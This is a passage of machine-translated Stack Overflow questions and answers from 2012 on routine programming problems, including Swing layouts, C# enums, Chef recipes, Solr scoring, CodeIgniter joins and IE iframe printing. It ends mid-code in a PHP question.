我有一个`JPanel`，它使用一个`BoxLayout.Y_AXIS`包含三个`JLabel`（JLabels 的名称 = 1,2,3）我需要该面板内的一个组件来锚定在 South（所以我使用胶水）

视图结果将是这样的：

* * *

1

2

3

* * *

然后我有一个`JButton`. 如果用户单击按钮，则会`JPanel`添加一个新`JLabel`的（JLabel 的名称 = neww）

这是查看结果：

* * *

1

2

3

新世界

* * *

但我需要这样的东西：

* * *

新世界

1

2

3

* * *

我应该怎么做？

是否可以处理它`BoxLayout`？

这是我尝试过的：

```
public class help extends JFrame implements ActionListener{
JPanel panel = new JPanel();
JButton insert = new JButton("insert");
JLabel a = new JLabel("1");
JLabel b = new JLabel("2");
JLabel c = new JLabel("3");
public help()  {
    setSize(300, 200);
    getContentPane().setLayout(new BorderLayout());
    getContentPane().add(panel, BorderLayout.CENTER);
    panel.setPreferredSize(new Dimension(250,150));
    getContentPane().add(insert, BorderLayout.SOUTH);
    insert.setPreferredSize(new Dimension(50,50));
    insert.addActionListener(this);
    panel.setLayout(new BoxLayout(panel, BoxLayout.Y_AXIS));
    panel.add(Box.createVerticalGlue());
    panel.add(a);
    panel.add(b);
    panel.add(c);

    setVisible(true);
}

public static void main (String[]args){
   new help();
}

@Override
public void actionPerformed(ActionEvent e) {
    panel.add(new JLabel("NEW"));
    panel.revalidate();
    panel.repaint();
} 
```

}

非常感谢您的任何帮助！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-31T21:46:16.607

有一个`add()`使用索引参数的方法版本。由于要在胶水后添加，请使用 1。

```
panel.add(new JLabel("NEW"), 1); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-31T21:37:44.257

`JPanel`您可以在该位置添加另一个`BorderLayout.NORTH`并添加到该面板。您也可以将 a`BoxLayout`用于该面板。

请注意，无需为您的 设置布局`JFrame`，因为`BorderLayout`这是该容器的默认布局。此外，没有必要设置面板​​的首选尺寸，因为`BorderLayout`会忽略这一点。

# desire2learn - D2L 当前路径？

> ID：13167672
> 
> 赞同：1
> 
> 时间：2012-10-31T21:25:49.617
> 
> 标签：desire2learn

当您单击播放按钮时，我有一个 javascript 可以在页面上播放音频文件。当前正常工作的代码如下所示：

```
<script type="text/javascript">player_button("/content/DEVELOPMENT/2012/courses/DEV-COURSENAME/FOLDERNAME/FILE.mp3");</script> 
```

我想知道如何使 URL 更短，以便其他课程编辑可以将其复制并粘贴到不同的页面中？例如，我尝试了以下方法，但它没有用，但这是我理想情况下希望代码接近的。

```
<script type="text/javascript">player_button(".../FOLDERNAME/FILE.mp3");</script> 
```

所以我想我要问的是如何找出课程的当前路径？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-01T18:00:56.410

如果您的 javascript 出现在 LMS 页面中嵌入的 HTML 中，那么您可以尝试使用`{OrgUnitPath}`替换字符串；如果您的 HTML 通过 LMS 的页面呈现引擎以注意到并扩展替换字符串的方式，则该替换字符串应该扩展为您需要的路径。

但是，并非所有可以添加到 LMS 的 HTML 都会以注意到替换字符串的方式通过 LMS 的页面呈现引擎：例如，如果您试图通过 LE 内容空间将此 HTML 作为内容提供，那么这可能行不通。

# python - 写了两个短脚本，都没有退出

> ID：13167676
> 
> 赞同：0
> 
> 时间：2012-10-31T21:26:11.837
> 
> 标签：python

我今天写了两个简短的脚本来处理我的文件。一种用下划线替换文件名中的空格，另一种读取目录中所有文件和文件夹的名称并将它们转储到 txt 文件中。然而，两人都没有放弃。它们都以 for 循环结束，我不知道为什么它们显然完成后都没有中断。如果我通过了quit()，脚本会按照我的意思去做，它们只需要手动中止。

这是下划线加法器：

```
import os

pathname = raw_input('Enter the pathname: ')
os.chdir(pathname)
filelist = os.listdir(pathname)
outfile = []
for idx, val in enumerate(filelist):
    outfile.append(val.replace(' ', '_'))
    os.rename(val, outfile[idx]) 
```

和目录内容阅读器：

```
import os

pathname = raw_input('What path\'s contents do you want listed? ')
os.chdir(pathname)
filelist = os.listdir(pathname)
file = open('out.txt', 'w')
for idx, val in enumerate(filelist):
        file.write(val + '\n') 
```

我假设由于两个脚本都做了非常相似的事情，所以它们不会因为类似的原因而中断。

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-31T21:40:43.137

答案很简单，在两个 for 循环都中断后添加一个 print 语句。一个简单的修复。感谢 Blender 的评论。

# c# - 如何编写一个将枚举作为泛型并返回 int 值的方法

> ID：13167677
> 
> 赞同：0
> 
> 时间：2012-10-31T21:26:10.997
> 
> 标签：c#, .net, enums

我正在尝试编写一个通用方法，该方法可以采用任何 int 类型的枚举并能够将其转换为其 int 值。例如：

```
public int GetIntValue(Enum enumValue) {
    return (int)enumValue;
} 
```

这是我完成此任务的一种方法，但似乎有更好的方法：

```
public static int ToInt(this Enum value) {
    return (int) Enum.Parse(value.GetType(), Enum.GetName(value.GetType(), value));
} 
```

有任何想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-31T21:31:23.753

您主要使用示例 2 - 您应该能够做到这一点：

```
public static int ToInt(this Enum value)
{
    return Convert.ToInt32(value);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-31T21:34:45.013

有几个选项可以将枚举转换为其基础值，这些选项也适用于泛型：

```
return Convert.ToInt32(enumValue) 
```

或者

```
return (int)enumValue; 
```

或者

```
Type integralType = Enum.GetUnderlyingType (enumValue.GetType());
return Convert.ChangeType (enumValueEnum, integralType); 
```

还是先返回字符串，然后再将其转换为int？

```
return int.Parse(anyEnum.ToString("D")); 
```

但我个人更喜欢第一个选项

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-31T21:41:37.903

下面的代码片段显示了使用泛型的两种方法。

```
public enum MyEnum
{
    Three = 3,
    Seven = 7
}

public static class MyExtensions
{
    public static int ToInt<T>(this T value)
    {
        return Convert.ToInt32(value);
    }
}

[TestFixture]
public class CodeTests
{
    public int GetInt<T>(T value)
    {
        return Convert.ToInt32(value);
    }

    [Test]
    public void TestOne()
    {
        Assert.AreEqual(7, GetInt(MyEnum.Seven));
    }

    [Test]
    public void TestTwo()
    {
        Assert.AreEqual(7, MyEnum.Seven.ToInt());
    }
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-31T21:42:14.567

简单明了，只需使用

```
public static int ToInt(this Enum value)
{
    return Convert.ToInt32(value);
} 
```

# c# - asp.net 歌剧打印对话框

> ID：13167678
> 
> 赞同：0
> 
> 时间：2012-10-31T21:26:14.447
> 
> 标签：c#, javascript, asp.net

在 javascript 中，以下代码不会显示实际的打印对话框。新窗口打开正常，但没有打印对话框。IE/Chrome/mozilla 都很好。我已经阅读了所有关于 opera 的常见超时问题，并尝试过我相信解决方案的所有可能性。

任何人都知道解决方案是什么？

```
var windowUrl = 'about:blank';
var UserLoggedIn = $("#lblUser").text()
var now = new Date();
var strDateTime = [
    [AddZero(now.getDate()), AddZero(now.getMonth() + 1), now.getFullYear()].join("/"), [AddZero(now.getHours()), AddZero(now.getMinutes())].join(":"), now.getHours() >= 12 ? "PM" : "AM"].join(" ");
var Database = 'ProductionDatabase';
var windowName = 'Report';
var AuditPrintDetailEverypage = UserLoggedIn + ' Time : ' + strDateTime;
var AuditPrintDetailLastPage = '      Report ' + ' Source Database: ';
var WinPrint = window.open(windowUrl, windowName, 'left=300,top=300,right=500,bottom=500,width=1000,height=500,scrollbars=1');
WinPrint.document.write('<' + 'html' + '><head><link href="assets/css/Print.css" rel="stylesheet" type="text/css" /><title>' + AuditPrintDetailEverypage + '</title> </head><' + 'body  style="background:none !important"' + '>');
WinPrint.document.write(printContent.innerHTML);
WinPrint.document.write('          ' + AuditPrintDetailLastPage);
WinPrint.document.write('<' + '/body' + '><' + '/html' + '>');
WinPrint.document.close();

if (window.opera) {
    window.onload = function () {
        window.setTimeout(function () {
            window.print;
        }, 500);
    }
} else {
    WinPrint.focus();
    WinPrint.print();
    WinPrint.close();
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-31T22:16:27.093

与某些网站相反，看起来（）对于歌剧很重要。希望这对其他人有帮助。回答上面的人的功劳。

```
 if (window.opera) {

                        WinPrint.onload = function () {
                            WinPrint.setTimeout(function () {
                                WinPrint.print();
                            }, 500);
                        } 
```

# c# - 通过代码将sitecore包安装到所有目标

> ID：13167680
> 
> 赞同：1
> 
> 时间：2012-10-31T21:26:20.827
> 
> 标签：c#, asp.net, sitecore, sitecore6

我已经想出了如何通过代码隐藏安装一个包（假设我有一个 zip 文件）。据我了解，它仅将其安装在主数据库上。然后如何将已安装的项目转移到网络数据库？Cna 我在 web 数据库上安装包？有没有办法在安装过程中获取项目，然后以某种方式发布它们？实现这一目标的最佳方法是什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-01T08:27:30.300

创建包时，您从特定数据库中选择项目。默认情况下这是 master，但您也可以从 core 和 web 中选择它们。

**项目将始终安装在与其来源相同的数据库中。**

![在此处输入图像描述](../Images/161ae40dc46ce2a9db579248500c6488.png)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-01T14:00:46.407

除非您知道在 master 中安装项目的确切根项目，否则最好的办法是通过 C# 从`master`到发布整个树`web`

[Content API Cookbook（ PDF 链接](http://sdn.sitecore.net/upload/sitecore6/64/content_api_cookbook-a4.pdf)）的第 2.2.2 节包含如何执行此操作的代码片段：

```
var master = Sitecore.Configuration.Factory.GetDatabase("master");
var target = Sitecore.Configuration.Factory.GetDatabase("web");
Sitecore.Data.Database[] targetDatabases = { target };
var languages = master.Languages;
Sitecore.Publishing.PublishManager.PublishIncremental(master, targetDatabases, languages); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-02T21:38:45.297

您可能可以尝试这样的方法。由于您已经从代码隐藏安装了包，因此您可以获得自包安装开始并发布它们以来修改项目的列表。

```
Item rootItem = Sitecore.Context.Database.GetItem(Sitecore.Context.Site.RootPath);
List<Item> modifiedItemList = rootItem.Axes.GetDescendants().
       Where(item => item.Statistics.Updated >= installDateTime 
             || item.Statistics.Created >= installDateTime).ToList();
// add te items in the list to the publishing queue 
```

该解决方案有点脏，但应该可以解决您的问题。

# regex - 通过 Shell 脚本从基于表格列的 HTML 中提取文本

> ID：13167683
> 
> 赞同：0
> 
> 时间：2012-10-31T21:26:26.173
> 
> 标签：regex, linux, bash, shell

我需要编写一个 shell 脚本来读取 html 文件`sample.html`并根据另一个表列从表列中提取数据。例如，这是 HTML 代码：

```
<table style="BORDER-COLLAPSE: collapse"
  border="0" bordercolor="#000000"
  cellpadding="3" cellspacing="0" width="100%" height="200">
  <tr >
    <td class="fontStyleOne" width="30%">
      <div align="left">
      core6690.myserverdomain.com </div>
    </td>
    <td  class="tdfontTwo" width="30%">
      <div class="label-styler" align="left">
      admin</div>
    </td>
  </tr>
  <tr >
    <td class="fontStyleOne" width="30%">
      <div align="left">
      core6691.myserverdomain.com </div>
    </td>
    <td  class="tdfontTwo" width="30%">
      <div class="label-styler" align="left">
      secondary </div>
    </td>
  </tr>
  <tr >
    <td  class="fontStyleOne" width="30%">
      <div align="left">
      core6692.myserverdomain.com </div>
    </td>
    <td  class="tdfontTwo" width="30%">
      <div class="label-styler" align="left">
      primary </div>
    </td>
  </tr>
</table> 
```

假设我想确定“admin”的 URL，那么结果将是 core6690.myserverdomain.com；如果我的输入是“主要”，那么输出将是“core6692.myserverdomain.com”等等......

HTML 页面有更多数据、页眉标签、页脚内容等，但我要查找的重要内容放在一个表中，其结构与我在代码中列出的完全相同......除了它还有更多行，不一定像本例中那样只有 3 行。

我在这个网站上看到了 seg、grep、正则表达式、awk 和其他工具的相关答案，但是它们都没有足够接近我正在寻找的东西......另外我对任何方法都没有太多经验作为修改并使它们适合我的需要。

有什么建议么？提前致谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-31T23:27:34.523

如果允许您使用其他工具，我的[Xidel可以做到这一点。](http://videlibri.sourceforge.net/xidel.html)

使用 xpath：

```
xidel /tmp/f.html -e "//tr[td[2] = 'admin']/td[1]" 
```

或模式匹配：

```
xidel /tmp/f.html -e "<tr><td>{.}</td><td>admin</td></tr> 
```

至少您发布的摘录是这样的，对于较大的文件，它取决于还有什么。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-31T23:55:09.593

```
#/bin/bash

for i in `cat sample.html | grep '<\/div>' | sed 's/\s\+//'|sed 's/<.*>//'`; do
    if [ $i == $1 ];
    then
        echo $prev
    fi
    prev=$i
done 
```

使用示例

```
$ ./filter.sh primary
core6692.myserverdomain.com 
```

Ps：sample.html 的格式应该是你在这里发布的，服务器和名称应该以标签结尾，并以空格或制表符开头。

# http-status-code-404 - 具有常见 404 页面重定向的 MSM 5 站点设置

> ID：13167684
> 
> 赞同：9
> 
> 时间：2012-10-31T21:26:30.763
> 
> 标签：http-status-code-404, expressionengine

所以我在一个主域下有 4 个子域的网站上工作。他们已经有 MSM 许可证，所以我用它来分解潜艇。

我的问题是：

处理所有网站的 404 重定向的最佳方法是什么？我想为主站点和所有子域使用一个通用的 404 页面。

在主站点上，这很容易。

```
{if no_results OR segment_3!=""}
    {redirect="404"}
{/if} 
```

但是，如果我要添加以下内容，其他网站不会只是为分析之类的内容注册页面视图：

```
{if no_results OR segment_3!=""}
    {embed="default_site:_includes/404"}
{/if} 
```

我希望能够在站点范围内获得相同的结果并捕获所有 404 统计信息。

谢谢，布赖恩

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-01T13:56:26.300

好的，所以我最终得到的是以下内容：

我在每个站点中创建了一个“_includes”模板组。然后，我在每个站点的模板组中创建了一个模板“404-Page”。（这实际上只是为了便于记忆。它们可以在您想要的任何模板组、模板配置中）

每一个都包含以下内容：

```
{embed="default_site:_includes/404-Page"} 
```

然后在每个站点下，在： Design => Templates => Global Preferences

我将网站设置为“启用严格 URL”=“是”和“404 页面”=“_includes/404-页面”

我在发送的标头中检查了这一点，它触发了 404 罚款。我遇到的问题之一是它在 IIS7 下的 Windows 服务器上运行。我还必须禁用 web.config 文件中的 404 错误并处理自定义 404 代码，如下所示：

```
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <httpErrors errorMode="Custom" existingResponse="Replace">
            <remove statusCode="404" subStatusCode="-1" />
            <error statusCode="404" path="/index.php/_includes/404-Page.html" responseMode="ExecuteURL" />
        </httpErrors>
    </system.webServer>
</configuration> 
```

我将此 web.config 文件放置在站点的每个根文件夹中。由于路径名称相同，因此这是一个简单的粘贴/转储。

我希望这对其他人有所帮助。;)

# c# - 同时在两个窗口之间共享内容

> ID：13167687
> 
> 赞同：1
> 
> 时间：2012-10-31T21:26:54.610
> 
> 标签：c#, wpf

我正在尝试共享两个窗口的内容，但它似乎没有像我预期的那样工作。

这是一个简单的例子：

```
class TestClass
{
    [STAThread]
    public static void Main(string[] args)
    {
        Application app = new Application();

        TextBox t = new TextBox();
        t.Text = "test";

        Window w1 = new Window();
        w1.Content = t;
        w1.Show();

        Window w2 = new Window();
        w2.Content = t;
        w2.Show();

        app.Run();
    }
} 
```

如果我在调试模式下单步执行程序，我可以看到它`w1`有文本框，但是一旦调用`w2.Content = t;`就会`w1`丢失文本框......然后它只显示在`w2`.

我还尝试在 Xmal 中使用绑定，其中两个窗口都指向同一个 ViewModel（具有名为 MySharedContent 的属性）

`Content="{Binding Path=MySharedContent}"`

但它不起作用。

这可能吗？我在做傻事吗？我在想两个窗口都会有一个指向要渲染的内容的指针……但似乎它们不能共享同一个实例？

编辑：

所以基本答案是 UI 元素（文本框、用户控件等）只能有 1 个父级。因此，我需要有两个单独的 UI 元素共享相同的关联数据。明白了（感谢大家的帮助，为大家投票）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-31T21:31:21.953

我猜控件的父容器会在分配时更新，从而创建该行为（尽管我最初也假设与您相同）。

你想做什么？如果您希望两个窗口同步，您可以传递一个字符串变量；使用此值更新每个备用窗口中的文本框。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-31T21:34:30.847

而不是试图在应用程序主中进行处理，您必须在每个表单事件处理程序中进行处理。

文本框示例；在`Form1`我们有`MyTextBox`在`Form2`我们也有我`MyTextBox`的等价物。在这两种形式中，当文本更改时，我都有一个事件处理程序。如果在`Form1`I中调用事件处理程序，则`Form2.MyTextBox.Text = Form1.MyTextBox.Text;`在 Form2 的事件处理程序中执行相反的操作。

在所有事件处理程序中执行此操作，表单将相互镜像。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-31T21:40:13.690

控件有一个`Parent`属性，该属性返回它们被放置的容器。因此，由于每个控件都`TextBox`需要有自己的一组属性，例如其大小和位置，因此您的方法无法工作。您可以共享两个窗口中`"test"`显示的值（在您的情况下为字符串），但不能共享它们本身。`TextBoxes``TextBoxes`

创建两个文本框！

# search - solr 以更多内容提升相关文档

> ID：13167689
> 
> 赞同：0
> 
> 时间：2012-10-31T21:27:01.427
> 
> 标签：search, solr, solr-boost

我有包含少量单词、少量句子和包含大量文本的文档的文档。当用户搜索某些内容时，solr 首先给出文本最少的文档作为最相关的文档，最后给出文本最多的文档。但是对于用户来说，相关性应该是不同的。第一个结果应该是相关的，但也需要包含更多的文本，因为用户需要获得最相关的文档但有更多的文本——阅读一些东西。

那么我怎样才能首先获得相关的文档，但首先是那些有更多文本的文档，而不是那些有几个单词的文档。我正在使用一个文本字段并在其中进行搜索。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-01T04:23:14.903

Lucene 使用的[DefaultSimilarity](http://lucene.apache.org/core/4_0_0-BETA/core/org/apache/lucene/search/similarities/DefaultSimilarity.html)类有一个[评分](http://www.lucenetutorial.com/advanced-topics/scoring.html)算法，有一个 lengthNorm 计算，它可以提升内容较少的文本而不是内容较多的文本。
基本上基于条款的数量。
您可以轻松扩展 Similarity 类以提供 LengthNorm 的自定义实现，从而使基于 NumOfTerms 的计算无效。
然后可以在[schema.xml](http://wiki.apache.org/solr/SchemaXml#Similarity)中指定此类，以便核心使用它。

> “Sweet one 计算 [min,max] 范围内（“甜蜜​​点”）内所有长度的恒定范数，而超出此范围的长度则计算出更小的标准值。短于或长于甜蜜点范围的文档将被“惩罚” "

min 和 max 的默认值是 1，所以它不适合你。尝试设置值，例如：-

```
 <similarity class="org.apache.lucene.misc.SweetSpotSimilarity"> 
   <str name="paramkey">param value</str> 
 </similarity> 
```

# pdf - phantomjs pdf 可点击的超链接

> ID：13167691
> 
> 赞同：4
> 
> 时间：2012-10-31T21:27:39.273
> 
> 标签：pdf, hyperlink, pdf-generation, phantomjs

在将 rasterize.js 与 phantomjs 一起使用后，我一直试图在 PDF 中获取可点击的超链接。我在 phantomjs code.google.com 页面上发现了一条评论，上面说支持超链接，但没有任何工作示例。我还尝试了[http://code.google.com/p/phantomjs/wiki/QuickStart上的快速入门指南中的示例](http://code.google.com/p/phantomjs/wiki/QuickStart)

有没有其他人得到这个工作？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-26T13:45:57.467

现在有一个错误，您可以在此处找到详细信息：[https](https://github.com/ariya/phantomjs/issues/10196) ://github.com/ariya/phantomjs/issues/10196 。理想情况下，链接可以工作，但现在不行。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-02T17:05:01.763

我不确定使用 PhantomJS 的 PDF 光栅化是否可以“点击”链接。我认为它只是将页面的图像保存到 PDF 中。根据 API 文档，它保存网页的图像缓冲区：[https ://github.com/ariya/phantomjs/wiki/Screen-Capture](https://github.com/ariya/phantomjs/wiki/Screen-Capture)

# xml - 验证 XML 时出错

> ID：13167692
> 
> 赞同：0
> 
> 时间：2012-10-31T21:27:44.353
> 
> 标签：xml, validation, netbeans

我已经创建了一个 XML 模式和一个相应的 XML 文件，我正在尝试验证它们。虽然 Notepad++ 通过了验证，但当尝试通过 Netbeans 验证它时，我得到一个“找不到元素计划”错误。时间表是根元素。经过一些尝试，我发现错误出现在命名空间声明中。我对 XML 没有那么丰富的经验，所以名称空间之类的细节仍然让我感到困惑。有什么帮助吗？

```
<xsd:schema xmlns:xsd="http://www.w3.org/2001/XMLSchema"
    targetNamespace="schedule"
    xmlns="schedule"
    elementFormDefault="qualified">
<xsd:element name="Schedule"> 
```

和 xml 文件：

```
<Schedule xmlns="schedule"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:noNamespaceSchemaLocation="schedule.xsd">
</Schedule> 
```

当然，这些元素之间存在线条，例如元素类型和子元素，但我没有包括它们以使其更短。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-01T00:43:49.223

您已在实例中包含 xsi:noNamespaceSchemaLocation ，但这不是无命名空间架构。您需要使用 xsi:schemaLocation （其值是一对包含命名空间 URI 和相应模式文档的位置）。

# mysql - chef_gem 的依赖项

> ID：13167696
> 
> 赞同：4
> 
> 时间：2012-10-31T21:28:24.310
> 
> 标签：mysql, ruby, rubygems, chef-infra, percona

我目前正在更新[社区 MySQL 食谱](http://community.opscode.com/cookbooks/mysql)，以便可以使用它来安装 Percona，它是现有 MySQL 的替代品，但具有一些附加功能，可以轻松启用 HA 和集群。

在我想能够使用食谱中的“红宝石”食谱之前，我所有的添加都运行良好。这使用“chef_gem”提供程序来安装“mysql”rubygem。由于这是一个本地扩展，因此需要对其进行编译，为此，需要安装 MySQL 的开发文件。

如果我使用普通的 MySQL 二进制文件一切正常，因为 MySQL 已经在 Centos 存储库中。但是，为了安装 Percona 软件包，我需要确保存储库位于“/etc/yum.repos.d”中。我遇到的问题是在尝试安装 mysql gem 之前我无法让厨师完成这项工作。

因此，最终发生的是系统尝试在没有安装 MySQL (Percona) 的开发头文件的情况下编译 mysql gem，即使正确引用它们，由于尚未设置存储库，因此找不到它们。

我创建了一个 'percona-repo' 配方，它使用 'yum' 提供程序来完成这项工作，但它不会在 'chef_gem' 之前运行。我知道厨师有两个运行阶段，我假设“chef_gem”在编译阶段收集所有宝石，无论它们在整个运行列表中的位置，然后安装开始时请求的所有项目。然后将运行存储库配方。

我尝试使用 Ruby 配方来执行以下操作：

```
include_recipe "mysql::percona_repo"

node['mysql']['client']['packages'].each do |mysql_pack|
    package mysql_pack do
        action :nothing
    end.run_action(:install)
end

chef_gem "mysql" do
   action :nothing
end.run_action(:install) 
```

但这不起作用。chef_gem 总是在我的“precona_repo”配方之前运行，所以包安装失败，如果它到了那么远，意味着 ruby​​ gem 安装也会失败。

如果有人对我如何解决这个问题有任何好主意，请告诉我。

**更新**

感谢 Mark 的建议，我现在更新了 'ruby' 配方，以便我调用资源来添加新密钥并将 repo 存储到服务器：

```
resources(:yum_key => "RPM-GPG-KEY-percona").run_action(:add)
resources(:yum_repository => "Percona").run_action(:add) 
```

现在我可以看到这些在厨师运行中被激活。但是，当我查看文件系统时，文件不存在，因此 mysql 客户端软件包的安装失败。

我在 yum 食谱中进行了一些挖掘，发现 yum_key 的提供者尝试运行“remote_file”来下载密钥，正如你所期望的那样。但是，此“remote_file”未运行。因此，我尝试将其作为上述资源运行，但它的名称中有一个变量，因此我无法有效地调用它，例如：

```
remote_file "/etc/pki/rpm-gpg/#{new_resource.key}" do
    ...
end 
```

我想我在这里开始有点像兔子沃伦了。我将继续尝试让这件事发挥作用，但欢迎更多想法。我试图不走在这个秘籍中直接在 repo 中编码的路线，因为我更喜欢重用我知道有效的东西。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-24T01:28:32.563

好吧，我一路走下兔子洞。

这似乎有效：

```
include_recipe "percona::client"

resources(:yum_key => "RPM-GPG-KEY-percona").run_action(:add)
begin
  resources(:remote_file => "/etc/pki/rpm-gpg/RPM-GPG-KEY-percona").run_action(:create)
rescue Chef::Exceptions::ResourceNotFound
end

resources("yum_repository[CentOS-Percona]").run_action(:add)
begin
  resources(:template => "/etc/yum.repos.d/CentOS-Percona.repo").run_action(:create)
rescue Chef::Exceptions::ResourceNotFound
end

%w(
  Percona-Server-shared-compat
  Percona-Server-client-55
  Percona-Server-devel-55
).each do |package|
  package(package).run_action(:install)
end

chef_gem "mysql" 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-01T02:17:46.133

无论您从配方中需要什么资源`percona_repo`，只需在`chef_gem`.

例如，如果您需要的东西如下所示：

```
yum_repo "percona-repo" do
  action :install
 ...
end 
```

`chef_gem`然后你可以在声明之前这样做：

```
resources(:yum_repo => 'percona-repo').run_action(:install) 
```

不幸的是，这确实在两个食谱之间引入了紧密耦合，但是没有办法说“嘿，厨师，包括这个食谱，但是马上做所有的事情而不是以后做，好吗？”

# mysql - mysql 使用多个连接（codeigniter）简化来自 EAV 的选择查询？

> ID：13167697
> 
> 赞同：0
> 
> 时间：2012-10-31T21:28:25.067
> 
> 标签：mysql, sql, codeigniter, join, entity-attribute-value

当前代码不会返回所有行。

例如，如果某些产品没有类别或用户活动被排除在选定的行之外。

如何使用有效的查询来简化该查询？

有没有办法通过多个工会或任何其他（简单）方式来做到这一点？

```
$q = $this->db->select('products.id, users_activity.timestamp AS added, products_content.lang, products_content.product_name, products_content.price, products_categories_content.category_name AS category, products_categories_content.category_id AS category_id')
        ->from('products')
        ->join('products_content', 'products.id = products_content.product_id')
        ->join('products_and_categories', 'products.id = products_and_categories.product_id')
        ->join('products_categories_content', 'products_categories_content.category_id = products_and_categories.category_id')
        ->join('users_activity', 'users_activity.id = products.id AND users_activity.lang = products_content.lang')->where('users_activity.type', 'product')
        ->group_by(array('products.id', 'products_content.lang', 'users_activity.id'))
        ->limit($limit, $offset)
        ->order_by($sort_by, $sort_order);

if (strlen($query_array['lang']) && ! is_numeric($query_array['lang'])) { $q->like('lang', $query_array['lang']); }
if (strlen($query_array['product_name'])) { $q->like('product_name', $query_array['product_name']); }
if (strlen($query_array['category'])) { $q->where('category_id', $query_array['category']); }

$return['rows'] = $q->get()->result(); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-31T22:09:25.510

默认情况下，CI 创建内部连接。内连接仅在两个表中都有记录时才查找结果。因此，如果产品没有类别，则此语句将不会返回任何记录。

```
$this->db->join('products_and_categories', 'products.id = products_and_categories.product_id'); 
```

将此联接更改为左联接，并且将始终返回产品，即使它们没有类别。

```
$this->db->join('products_and_categories', 'products.id = products_and_categories.product_id', left); 
```

# php - Foreach 循环遍历一个对象

> ID：13167703
> 
> 赞同：0
> 
> 时间：2012-10-31T21:28:41.243
> 
> 标签：php, object, foreach

我如何遍历这个对象并阅读`conversion_id`. 我尝试了以下foreach，但我似乎做错了。

```
<?php
    foreach( $result->response->data as $key=>$value ) {
        echo $value->Stat->conversion_id.' ';
    }
?>

stdClass Object
(
    [response] => stdClass Object
        (
            [status] => 1
            [data] => stdClass Object
                (
                    [data] => Array
                        (
                            [0] => stdClass Object
                                (
                                    [Stat] => stdClass Object
                                        (
                                            [conversion_id] => 351140
                                        )
                                )

                            [1] => stdClass Object
                                (
                                    [Stat] => stdClass Object
                                        (
                                            [conversion_id] => 355704
                                        )
                                }
                        )
                )
        )

) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-31T21:32:30.870

你想迭代`$result->response->data->data`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-31T21:32:35.293

您错过了“数据”和“统计”对象：

```
<?php
    foreach( $result->response->data->data as $key=>$value ) {
        echo $value->Stat->conversion_id;
    }
?> 
```

# javascript - 在窗口中获取第一个可见的 iFrame 并打印它

> ID：13167705
> 
> 赞同：2
> 
> 时间：2012-10-31T21:28:49.507
> 
> 标签：javascript, jquery, iframe, telerik, radwindow

有点荒谬的情况...这仅适用于IE8及更低版本。

无论如何，我有一个 iFrame 出现（我无法控制/创建一个 ID），感谢 Telerik！

```
// The only way I can grab it specifically would be:
var iframe = document.frames ? document.frames[id] : document.getElementById(id);
                                             // ^ you grab by ID in IE
var ifWin = iframe.contentWindow || iframe; 
```

但是由于我没有ID，所以无法使用这种方法……我尝试了几种不同的方法，均未成功。

```
// tried either window. / or document.
document.frames.print();
window.frames.print();
document.frames[0].print(); 
```

**我基本上只想抓住第一个 iFrame -> 并打印它**

**旁注**：`window.print()`适用于除 IE8 及更低版本之外的所有内容。对于 IE，它只打印外部/父窗口内容，而不是当前关注的 iFrame。

有什么想法吗？

* * *

**更新：**所以`window.frames[2].print()`在*IE 控制台*中以某种方式工作（并抓取正确的帧）。当我尝试将此代码放入 Javascript 中时，我有完全相同的事情：`window.frames[2].print()`IE 将此代码解释为*点符号* `window.frames.2`并且不起作用并返回为 null 或不是对象。在控制台中输入相同的点符号不起作用，只会给我“预期的;” （这没有任何意义）。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-31T22:29:57.980

你试过了吗

```
document.getElementsByTagName('iframe')[0] 
```

我在 IE8 控制台中对此进行了测试，它可以工作（但它可能在您的更新中仍然存在问题）。

至于关于打印第一个**可见**iframe 的问题的另一部分，您可能需要查看 scrollX 和 scrollY 以及 offsetTop 和 offsetLeft，不是吗？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-31T22:28:07.233

javascript 中的这些旧*集合中的大多数都有一个**方法** 称为`item`，所以试试这个：

```
window.frames.item(2).print(); 
```

(*) 不要奇怪，`typeof window.frames.item`会`'object'`。

# php - php 正在移动我的图像

> ID：13167710
> 
> 赞同：0
> 
> 时间：2012-10-31T21:02:31.213
> 
> 标签：php, image, css, alignment

[http://jajuka.net/stark/logo.php](http://jajuka.net/stark/logo.php)

Iv 使用 php 生成图像按钮，但由于某种原因，图像似乎向右移动。Iv 尝试使用 CSS 修复它，但这似乎没有帮助。这是使用的代码 iv 以及 css 和一个实时示例。请有人帮助我。

```
<?php

    $dirname = "artwork/logo/";

    $images = scandir($dirname);

    shuffle($images);

    $ignore = array(".", "..");

    foreach($images as $curimg){

